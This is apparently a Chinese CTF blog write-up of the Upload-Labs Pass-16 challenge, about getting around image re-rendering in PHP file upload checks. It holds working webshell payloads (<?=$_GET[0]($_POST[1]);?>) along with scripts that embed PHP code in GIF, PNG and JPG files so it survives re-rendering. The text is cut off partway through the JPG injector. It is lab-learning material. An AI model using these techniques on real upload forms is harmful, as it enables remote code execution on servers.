20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e5%8f%aa%e5%85%81%e8%ae%b8%e4%b8%8a%e4%bc%a0%e5%90%8e%e7%bc%80%e4%b8%ba.jpg%7c.png%7c.gif%e7%9a%84%e5%9b%be%e7%89%87%e6%96%87%e4%bb%b6%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2fdiv%3e%3cp%3e%e2%80%8b%09%e6%8f%90%e7%a4%ba%ef%bc%9a%3ccode%3e%e6%9c%acpass%e9%87%8d%e6%96%b0%e6%b8%b2%e6%9f%93%e4%ba%86%e5%9b%be%e7%89%87%ef%bc%81%3c%2fcode%3e%e3%80%82%e8%af%b4%e6%98%8e%e5%af%b9%e5%9b%be%e7%89%87%e8%bf%9b%e8%a1%8c%e4%ba%86%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%ef%bc%8c%e6%88%91%e7%9a%84%e7%90%86%e8%a7%a3%e5%b0%b1%e6%98%af%e6%8a%8a%e4%b8%8a%e4%bc%a0%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%8c%e6%a0%b9%e6%8d%ae%e4%b8%80%e4%ba%9b%e6%a0%87%e5%87%86%ef%bc%8c%e5%8f%aa%e6%8a%8a%e5%9b%be%e7%89%87%e4%b8%ad%e7%9a%84%e5%9b%be%e7%89%87%e4%bf%a1%e6%81%af%e6%8f%90%e5%8f%96%e5%87%ba%e6%9d%a5%ef%bc%8c%e5%86%8d%e7%94%9f%e6%88%90%e4%b8%80%e4%b8%aa%e5%9b%be%e7%89%87%ef%bc%8c%e5%8f%af%e4%bb%a5%e6%9c%89%e6%95%88%e9%81%bf%e5%85%8d%e5%9b%be%e7%89%87%e9%a9%ac%e3%80%82%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=%2fposts%2fctf%2fupload-labs4%2f&t=Upload-Labs%e4%b9%8bPass-16" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#pass-16>Pass-16</a></li><li><a href=#第一种方法>第一种方法</a><ul><li><a href=#jpg格式>jpg格式</a></li><li><a href=#其他格式>其他格式</a></li></ul></li><li><a href=#第二种方法>第二种方法</a><ul><li><a href=#gif格式>GIF格式</a></li><li><a href=#png格式>png格式</a></li><li><a href=#jpg格式-1>jpg格式</a></li></ul></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Upload-Labs之Pass-16</h1><div class=meta><div class=postdate><time datetime="2020-11-16 22:50:25 +0000 UTC" itemprop=datePublished>2020-11-16</time></div><div class=article-category><i class="fas fa-archive"></i>
<a class=category-link href=/categories/ctf>CTF</a></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E rel=tag>文件上传漏洞</a></div></div></header><div class=content itemprop=articleBody><h2 id=前言>前言</h2><p>​ 我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p><p>​ 参考博客：<a href=https://xz.aliyun.com/t/2657#toc-4>upload-labs之pass 16详细分析</a></p><h2 id=pass-16>Pass-16</h2><p>​ 源码（三种图片的判定，只贴一个吧，篇幅小一点）：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$is_upload <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>$msg <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;submit&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $filename <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;upload_file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>];
</span></span><span style=display:flex><span>    $filetype <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;upload_file&#39;</span>][<span style=color:#e6db74>&#39;type&#39;</span>];
</span></span><span style=display:flex><span>    $tmpname <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;upload_file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $target_path<span style=color:#f92672>=</span><span style=color:#a6e22e>UPLOAD_PATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>basename</span>($filename);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 获得上传文件的扩展名
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $fileext<span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>strrchr</span>($filename,<span style=color:#e6db74>&#34;.&#34;</span>),<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//判断文件后缀与类型，合法才进行上传操作
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span>(($fileext <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;jpg&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> ($filetype<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;image/jpeg&#34;</span>)){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>move_uploaded_file</span>($tmpname,$target_path)){
</span></span><span style=display:flex><span>            <span style=color:#75715e>//使用上传的图片生成新的图片
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $im <span style=color:#f92672>=</span> <span style=color:#a6e22e>imagecreatefromjpeg</span>($target_path);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($im <span style=color:#f92672>==</span> <span style=color:#66d9ef>false</span>){
</span></span><span style=display:flex><span>                $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;该文件不是jpg格式的图片！&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#f92672>@</span><span style=color:#a6e22e>unlink</span>($target_path);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                <span style=color:#75715e>//给新图片指定文件名
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#a6e22e>srand</span>(<span style=color:#a6e22e>time</span>());
</span></span><span style=display:flex><span>                $newfilename <span style=color:#f92672>=</span> <span style=color:#a6e22e>strval</span>(<span style=color:#a6e22e>rand</span>())<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.jpg&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#75715e>//显示二次渲染后的图片（使用用户上传图片生成的新图片）
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                $img_path <span style=color:#f92672>=</span> <span style=color:#a6e22e>UPLOAD_PATH</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span>$newfilename;
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>imagejpeg</span>($im,$img_path);
</span></span><span style=display:flex><span>                <span style=color:#f92672>@</span><span style=color:#a6e22e>unlink</span>($target_path);
</span></span><span style=display:flex><span>                $is_upload <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;上传出错！&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(($fileext <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;png&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> ($filetype<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;image/png&#34;</span>)){
</span></span><span style=display:flex><span>        <span style=color:#f92672>......</span>
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(($fileext <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;gif&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> ($filetype<span style=color:#f92672>==</span><span style=color:#e6db74>&#34;image/gif&#34;</span>)){
</span></span><span style=display:flex><span>        <span style=color:#f92672>.....</span>
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>​ 提示：<code>本pass重新渲染了图片！</code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。</p><p>​ 首先是分析一波源码：</p><p>​ 以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行<code>move_uploaded_file</code>函数先把文件移动到<code>upload</code>文件夹，现在文件路径是<code>$target_path</code>，之后对图片进行二次渲染。</p><p>​ 二次渲染用到了<code>imagecreatefromjpeg</code>函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行<code>unlink</code>函数删除文件，否则，为新图片随机一个名称，执行<code>imagejpeg</code>函数把图象输出到新文件<code> $newfilename</code>。再将之前用户上传的文件<code>$target_path</code>删除掉。</p><p>​ 根据上面的分析就能得出来两种思路：</p><ol><li><strong>访问二次渲染之前的上传的文件。</strong></li><li><strong>在图片二次渲染以后图片马未失效。</strong></li></ol><h2 id=第一种方法>第一种方法</h2><p>​ （Linux环境、php版本7.2.21）</p><p>​ 因为二次渲染那部分<code>if、else</code>无论如何都会执行<code>unlink</code>函数删除你的文件，需要在执行<code>imagecreatefromjpeg</code>时报错才能访问到自己原来上传的文件。</p><h3 id=jpg格式>jpg格式</h3><h4 id=准备并上传>准备并上传</h4><p>​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200050.png alt></p><h4 id=文件包含验证>文件包含验证</h4><p>​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用<code>inclue.php</code>文件包含访问刚刚上传的文件</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116200401.png alt></p><h3 id=其他格式>其他格式</h3><p>​ 如图成功访问就是图片马上传成功了。但是这个方法我只有<code>jpg</code>格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>，这三个函数的原理，让其报错即可。</p><h2 id=第二种方法>第二种方法</h2><p>​ （windows环境，php版本5.2.17）</p><p>​ 这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。</p><p>​ 用到的工具是<strong>Beyond Compare 4</strong>，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。</p><h3 id=gif格式>GIF格式</h3><h4 id=准备并上传-1>准备并上传</h4><p>​ 上传一个使用<code>copy /b</code>指令制作的图片马，之前文章第13题用过。假设上传的图片马为<strong>yoo.gif</strong>，上传成功以后再下载下载的文件名为<strong>2119840023.gif</strong>。</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116203245.png alt></p><h4 id=文件比较>文件比较</h4><p>​ 使用前面说的<strong>Beyond Compare 4</strong>工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件<strong>相同</strong>的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。<code>&lt;?php phpinfo(); ?></code>的十六进制是<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>直接粘贴插入，在右边框中右键保存文件再进行上传。</p><h4 id=文件包含验证-1>文件包含验证</h4><p>​ 上传以后进行文件包含，代码执行成功。</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204104.png alt></p><p>​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。</p><h3 id=png格式>png格式</h3><p>​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116204635.png alt></p><p>​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的<strong>头标识</strong>部分，修改的话就不是png格式图片，更过不了。</p><p>​ 所以我直接看答案了，还是前言里的<a href=https://xz.aliyun.com/t/2657#toc-3>博客</a>。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。</p><p>​ 所以又出来了两种方法：</p><ol><li>修改CRC码</li><li>直接生成图片</li></ol><h4 id=计算crc码>计算CRC码</h4><p>​ 计算CRC码的<code>python</code>脚本</p><pre tabindex=0><code>import binascii
import re

png = open(r&#39;1.png&#39;,&#39;rb&#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
print hex(crc)
</code></pre><h5 id=准备>准备</h5><p>​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分<strong>写入代码</strong>，再重新计算CRC码，再修改原来的CRC码即可。</p><h5 id=计算crc码-1>计算CRC码</h5><p>​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。</p><p>这个方法我没有尝试，因为我不会python。<del>都2020年了还有人不会python，不会吧不会吧</del>。😒</p><p>等我学会在回来改这一篇吧。</p><h4 id=直接生成图片写入实际数据模块>直接生成图片（写入实际数据模块）</h4><p>​ 国外大牛的脚本，直接运行就会生成一个图片</p><pre tabindex=0><code>&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre><p>​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为<code>php.exe</code>的可执行文件，它是php提供的一种<strong>CLI</strong>模式，也就是<strong>命令行模式</strong>。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。</p><p>​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。</p><p>​ 运行成功以后会找到一个名为<strong>1.png</strong>的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。</p><p>​ 但是这个生成的图片php代码是<code>&lt;?=$_GET[0]($_POST[1]);?></code>，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，<del>应该算吧</del></p><h3 id=jpg格式-1>jpg格式</h3><p>​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
</span></span></span><span style=display:flex><span><span style=color:#75715e>    It is necessary that the size and quality of the initial image are the same as those of the processed image.
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    1) Upload an arbitrary image via secured files upload script
</span></span></span><span style=display:flex><span><span style=color:#75715e>    2) Save the processed image and launch:
</span></span></span><span style=display:flex><span><span style=color:#75715e>    jpg_payload.php &lt;jpg_name.jpg&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    In case of successful injection you will get a specially crafted image, which should be uploaded again.
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    Since the most straightforward injection method is used, the following problems can occur:
</span></span></span><span style=display:flex><span><span style=color:#75715e>    1) After the second processing the injected data may become partially corrupted.
</span></span></span><span style=display:flex><span><span style=color:#75715e>    2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
</span></span></span><span style=display:flex><span><span style=color:#75715e>    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    Sergey Bobrov @Black2Fan.
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    See also:
</span></span></span><span style=display:flex><span><span style=color:#75715e>    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>    */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $miniPayload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?=phpinfo();?&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>extension_loaded</span>(<span style=color:#e6db74>&#39;gd&#39;</span>) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;imagecreatefromjpeg&#39;</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;php-gd is not installed&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($argv[<span style=color:#ae81ff>1</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>set_error_handler</span>(<span style=color:#e6db74>&#34;custom_error_handler&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($pad <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $pad <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1024</span>; $pad<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        $nullbytePayloadSize <span style=color:#f92672>=</span> $pad;
</span></span><span style=display:flex><span>        $dis <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataInputStream</span>($argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        $outStream <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>        $extraBytes <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        $correctImage <span style=color:#f92672>=</span> <span style=color:#66d9ef>TRUE</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readShort</span>() <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0xFFD8</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Incorrect SOI marker&#39;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>((<span style=color:#f92672>!</span>$dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>eof</span>()) <span style=color:#f92672>&amp;&amp;</span> ($dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readByte</span>() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xFF</span>)) {
</span></span><span style=display:flex><span>            $marker <span style=color:#f92672>=</span> $dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readByte</span>();
</span></span><span style=display:flex><span>            $size <span style=color:#f92672>=</span> $dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readShort</span>() <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>            $dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>skip</span>($size);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($marker <span style=color:#f92672>===</span> <span style=color:#ae81ff>0xDA</span>) {
</span></span><span style=display:flex><span>                $startPos <span style=color:#f92672>=</span> $dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>seek</span>();
</span></span><span style=display:flex><span>                $outStreamTmp <span style=color:#f92672>=</span> 
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>substr</span>($outStream, <span style=color:#ae81ff>0</span>, $startPos) <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                    $miniPayload <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>str_repeat</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>,$nullbytePayloadSize) <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>substr</span>($outStream, $startPos);
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>checkImage</span>(<span style=color:#e6db74>&#39;_&#39;</span><span style=color:#f92672>.</span>$argv[<span style=color:#ae81ff>1</span>], $outStreamTmp, <span style=color:#66d9ef>TRUE</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span>($extraBytes <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>while</span>((<span style=color:#f92672>!</span>$dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>eof</span>())) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span>($dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readByte</span>() <span style=color:#f92672>===</span> <span style=color:#ae81ff>0xFF</span>) {
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>if</span>($dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>readByte</span> <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0x00</span>) {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    $stopPos <span style=color:#f92672>=</span> $dis<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>seek</span>() <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>                    $imageStreamSize <span style=color:#f92672>=</span> $stopPos <span style=color:#f92672>-</span> $startPos;
</span></span><span style=display:flex><span>                    $outStream <span style=color:#f92672>=</span> 
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>substr</span>($outStream, <span style=color:#ae81ff>0</span>, $startPos) <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                        $miniPayload <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>substr</span>(
</span></span><span style=display:flex><span>                            <span style=color:#a6e22e>str_repeat</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>,$nullbytePayloadSize)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>                                <span style=color:#a6e22e>substr</span>($outStream, $startPos, $imageStreamSize),
</span></span><span style=display:flex><span>                            <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>                            $nullbytePayloadSize<span style=color:#f92672>+</span>$imageStreamSize<span style=color:#f92672>-</span>$extraBytes) <span style=color:#f92672>.</span> 
</span></span><span style=display:flex><span>                                <span style=color:#a6e22e>substr</span>($outStream, $stopPos);
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>elseif</span>($correctImage) {
</span></span><span style=display:flex><span>                    $outStream <span style=color:#f92672>=</span> $outStreamTmp;
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>checkImage</span>(<span style=color:#e6db74>&#39;payload_&#39;</span><span style=color:#f92672>.</span>$argv[<span style=color:#ae81ff>1</span>], $outStream)) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Success!&#39;</span>);
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unlink</span>(<span style=color:#e6db74>&#39;payload_&#39;</span><span style=color:#f92672>.</span>$argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Something\&#39;s wrong&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>checkImage</span>($filename, $data, $unlink <span style=color:#f92672>=</span> <span style=color:#66d9ef>FALSE</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> $correctImage;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>($filename, $data);
</span></span><span style=display:flex><span>        $correctImage <span style=color:#f92672>=</span> <span style=color:#66d9ef>TRUE</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>imagecreatefromjpeg</span>($filename);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($unlink)
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>unlink</span>($filename);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $correctImage;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>custom_error_handler</span>($errno, $errstr, $errfile, $errline) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> $extraBytes, $correctImage;
